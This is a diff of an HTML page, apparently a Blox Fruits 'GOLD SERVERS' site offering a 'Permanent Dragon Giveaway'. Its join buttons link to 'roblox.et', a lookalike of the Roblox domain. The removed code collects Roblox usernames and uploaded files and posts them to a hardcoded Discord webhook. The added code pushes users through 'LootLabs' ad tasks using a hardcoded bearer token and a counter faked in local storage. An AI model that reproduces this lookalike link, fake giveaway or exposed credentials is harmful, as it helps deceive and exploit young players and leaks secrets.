@@ -11,18 +11,17 @@
             text-align: center;
             padding: 20px;
             overflow-x: hidden;
-        }header {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        padding: 15px 30px;
-        background: rgba(255, 255, 255, 0.1);
-        border-radius: 15px;
-        box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
-        animation: glow 2s infinite alternate;
-    }
-
-    @keyframes glow {
+        }
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 30px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+            animation: glow 2s infinite alternate;
+        }@keyframes glow {
         from { box-shadow: 0 0 15px rgba(255, 255, 255, 0.1); }
         to { box-shadow: 0 0 30px rgba(255, 255, 255, 0.5); }
     }
@@ -71,31 +70,6 @@
         box-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
     }
 
-    .fireflies {
-        position: fixed;
-        width: 100%;
-        height: 100%;
-        overflow: hidden;
-        top: 0;
-        left: 0;
-        z-index: -1;
-    }
-
-    .firefly {
-        position: absolute;
-        width: 5px;
-        height: 5px;
-        background: #fff;
-        border-radius: 50%;
-        animation: fly 10s infinite ease-in-out;
-    }
-
-    @keyframes fly {
-        0% { transform: translateY(0) translateX(0); opacity: 0.5; }
-        50% { transform: translateY(-200px) translateX(200px); opacity: 1; }
-        100% { transform: translateY(0) translateX(0); opacity: 0.5; }
-    }
-
     .perm-dragon-counter {
         font-size: 2rem;
         color: #FFD700;
@@ -113,11 +87,19 @@
         50% { transform: scale(1.1); }
         100% { transform: scale(1); }
     }
+
+    .cool-animation {
+        animation: coolGlow 3s infinite alternate;
+    }
+
+    @keyframes coolGlow {
+        from { box-shadow: 0 0 20px rgba(0, 255, 255, 0.5); }
+        to { box-shadow: 0 0 40px rgba(0, 255, 255, 1); }
+    }
 </style>
 
 </head>
 <body>
-    <div class="fireflies"></div>
     <header>
         <h1 style="color: #A020F0; animation: glow 2s infinite alternate;">GOLD SERVERS</h1>
         <nav>
@@ -125,43 +107,27 @@
             <a href="#dashboard">Dashboard</a>
             <a href="#feedback">Feedback</a>
         </nav>
-    </header><main>
-    <div class="ad-container">
-        <h2>🔥 Paid Advertisement 🔥</h2>
-        <iframe width="100%" height="315" src="https://youtu.be/rgaJPR64hMA?si=NbIQaiZvF0kI7IeE" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-    </div>
-
-    <section class="server">
-        <h2>BloxFruit Server 1</h2>
-        <a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">
-            <button class="join-button">🚀 Join Server</button>
-        </a>
-    </section>
-
-    <section class="server">
+    </header>
+    <main>
+        <section class="server">
+            <h2>BloxFruit Server 1</h2>
+            <a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">
+                <button class="join-button">🚀 Join Server</button>
+            </a>
+        </section><section class="server">
         <h2>BloxFruit Server 2</h2>
         <a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">
             <button class="join-button">🚀 Join Server</button>
         </a>
     </section>
 
-    <section class="giveaway" id="dashboard">
+    <section class="giveaway cool-animation" id="dashboard">
         <h2>🎉 Permanent Dragon Giveaway 🎉</h2>
         <p>Perm Dragons Given:</p>
         <div class="perm-dragon-counter" id="perm-dragon-counter">18</div>
 
-        <p>To get Dragon, here's what you have to do:</p>
-        <ol>
-            <li>Make or download my vids and upload them to YouTube (use my title & description).</li>
-            <li>Put my site link in your comment: <a href="https://linktr.ee/Gamerisgamer" target="_blank">Gamerisgamer</a></li>
-            <li>Every 200 views you get, you earn 1 Permanent Dragon.</li>
-        </ol>
-        <p>Send proof here (if you lie, you won't get anything):</p>
-        <form id="proof-form">
-            <input type="text" id="roblox-user" placeholder="Enter your Roblox username" required>
-            <input type="file" id="proof-file" accept="image/*" required>
-            <button type="submit" class="giveaway-button">📁 Send Proof</button>
-        </form>
+        <p>Complete LootLabs 3 times to claim your Permanent Dragon:</p>
+        <button class="giveaway-button" onclick="startLootLabs()">💎 Start LootLabs 💎</button>
     </section>
 
     <section class="feedback-form" id="feedback">
@@ -175,55 +141,43 @@
 </main>
 
 <script>
-    // Firefly generation
-    for (let i = 0; i < 20; i++) {
-        const firefly = document.createElement('div');
-        firefly.classList.add('firefly');
-        firefly.style.top = Math.random() * 18+ 'vh';
-        firefly.style.left = Math.random() * 18+ 'vw';
-        document.querySelector('.fireflies').appendChild(firefly);
-    }
-
-    // Perm Dragon Counter
-    let permDragonCount = localStorage.getItem('permDragonCount') || 100;
+    let permDragonCount = localStorage.getItem('permDragonCount') || 18;
     const counterElement = document.getElementById('perm-dragon-counter');
 
     function updateCounter() {
-        permDragonCount++;
         counterElement.textContent = permDragonCount;
-        localStorage.setItem('permDragonCount', permDragonCount);
     }
 
-    setInterval(updateCounter, 60000); // Increment every minute
+    updateCounter();
 
-    // Proof submission
-    document.getElementById('proof-form').addEventListener('submit', function(event) {
-        event.preventDefault();
-        const username = document.getElementById('roblox-user').value;
-        const file = document.getElementById('proof-file').files[0];
-        const formData = new FormData();
-
-        formData.append('file', file);
-        formData.append('payload_json', JSON.stringify({
-            embeds: [{
-                title: "Dragon Giveaway Proof",
-                description: `Proof from **${username}**` + ` | Perm Dragon Count: ${permDragonCount}`,
-                color: 3447003
-            }]
-        }));
-
-        fetch('https://discord.com/api/webhooks/1306937739702308915/-kxWY0Xk3Ci95HR7DjHZyw2BcMSc3CvkwMwllTDEOve0LmozUU3QgGT8k51FtCCylQiI', {
+    function startLootLabs() {
+        fetch('https://api.lootlabs.io/track', {
             method: 'POST',
-            body: formData
-        }).then(response => {
-            if (response.ok) {
-                alert('Proof sent successfully!');
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': 'Bearer c68ee820b85fd25a7d147bf950f3ee318752b7285a7d4c58710a4e011527d1e4'
+            },
+            body: JSON.stringify({ userId: 'roblox-user', task: 'complete' })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.completions >= 3) {
+                permDragonCount++;
+                localStorage.setItem('permDragonCount', permDragonCount);
+                updateCounter();
+                alert('🎉 Congrats! You earned a Permanent Dragon. 🎉');
             } else {
-                alert('Error sending proof.');
+                alert(`Progress: ${data.completions}/3 tasks completed.`);
             }
-        }).catch(error => {
+        })
+        .catch(error => {
             alert('Error: ' + error.message);
         });
+    }
+
+    document.getElementById('feedback-form').addEventListener('submit', function(event) {
+        event.preventDefault();
+        alert('Feedback submitted!');
     });
 </script>
 
